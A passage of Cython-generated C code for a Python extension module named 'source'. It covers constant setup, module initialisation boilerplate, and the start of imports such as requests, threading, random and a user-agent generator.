  __pyx_int_150 = PyInt_FromLong(150); if (unlikely(!__pyx_int_150)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_200 = PyInt_FromLong(200); if (unlikely(!__pyx_int_200)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_999 = PyInt_FromLong(999); if (unlikely(!__pyx_int_999)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1300 = PyInt_FromLong(1300); if (unlikely(!__pyx_int_1300)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2000 = PyInt_FromLong(2000); if (unlikely(!__pyx_int_2000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_100000 = PyInt_FromLong(100000L); if (unlikely(!__pyx_int_100000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1279000 = PyInt_FromLong(1279000L); if (unlikely(!__pyx_int_1279000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1279001 = PyInt_FromLong(1279001L); if (unlikely(!__pyx_int_1279001)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_17750000 = PyInt_FromLong(17750000L); if (unlikely(!__pyx_int_17750000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_17750001 = PyInt_FromLong(17750001L); if (unlikely(!__pyx_int_17750001)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_279760000 = PyInt_FromLong(279760000L); if (unlikely(!__pyx_int_279760000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_279760001 = PyInt_FromLong(279760001L); if (unlikely(!__pyx_int_279760001)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_900990000 = PyInt_FromLong(900990000L); if (unlikely(!__pyx_int_900990000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_900990001 = PyInt_FromLong(900990001L); if (unlikely(!__pyx_int_900990001)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1629010000 = PyInt_FromLong(1629010000L); if (unlikely(!__pyx_int_1629010000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1900000000 = PyInt_FromLong(1900000000L); if (unlikely(!__pyx_int_1900000000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2500000000 = PyInt_FromString((char *)"2500000000", 0, 0); if (unlikely(!__pyx_int_2500000000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_3713668786 = PyInt_FromString((char *)"3713668786", 0, 0); if (unlikely(!__pyx_int_3713668786)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_5699785217 = PyInt_FromString((char *)"5699785217", 0, 0); if (unlikely(!__pyx_int_5699785217)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_8507940634 = PyInt_FromString((char *)"8507940634", 0, 0); if (unlikely(!__pyx_int_8507940634)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_21254029834 = PyInt_FromString((char *)"21254029834", 0, 0); if (unlikely(!__pyx_int_21254029834)) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct__genexpr) < 0) __PYX_ERR(0, 93, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct__genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct__genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct__genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct__genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct__genexpr = &__pyx_type_6source___pyx_scope_struct__genexpr;
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct_1_genexpr) < 0) __PYX_ERR(0, 94, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct_1_genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct_1_genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct_1_genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct_1_genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct_1_genexpr = &__pyx_type_6source___pyx_scope_struct_1_genexpr;
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct_2_genexpr) < 0) __PYX_ERR(0, 95, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct_2_genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct_2_genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct_2_genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct_2_genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct_2_genexpr = &__pyx_type_6source___pyx_scope_struct_2_genexpr;
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct_3_genexpr) < 0) __PYX_ERR(0, 479, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct_3_genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct_3_genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct_3_genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct_3_genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct_3_genexpr = &__pyx_type_6source___pyx_scope_struct_3_genexpr;
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  Py_ssize_t __pyx_t_13;
  Py_UCS4 __pyx_t_14;
  long __pyx_t_15;
  int __pyx_t_16;
  PyObject *(*__pyx_t_17)(PyObject *);
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  if (unlikely(__Pyx_modinit_type_init_code() < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_generate_user_agent);
  __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_generate_user_agent);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_generate_user_agent, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Thread);
  __Pyx_GIVEREF(__pyx_n_s_Thread);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Thread);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_threading, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Thread); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Thread, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_choice);
  __Pyx_GIVEREF(__pyx_n_s_choice);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_choice);
  __Pyx_INCREF(__pyx_n_s_randrange);
  __Pyx_GIVEREF(__pyx_n_s_randrange);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_s_randrange);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_random, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_choice, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_randrange, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_re, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_re, __pyx_t_2) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_randrange);
  __Pyx_GIVEREF(__pyx_n_s_randrange);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_randrange);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_rr, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_choice);
  __Pyx_GIVEREF(__pyx_n_s_choice);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_choice);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_random, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cc, __pyx_t_1) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_generate_user_agent);
  __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_generate_user_agent);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_gg, __pyx_t_2) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_post);
  __Pyx_GIVEREF(__pyx_n_s_post);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_post);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_post); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pp, __pyx_t_1) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_2) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_2) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_get);
  __Pyx_GIVEREF(__pyx_n_s_get);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_get);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get, __pyx_t_2) < 0) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_Topython, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Topython, __pyx_t_1) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
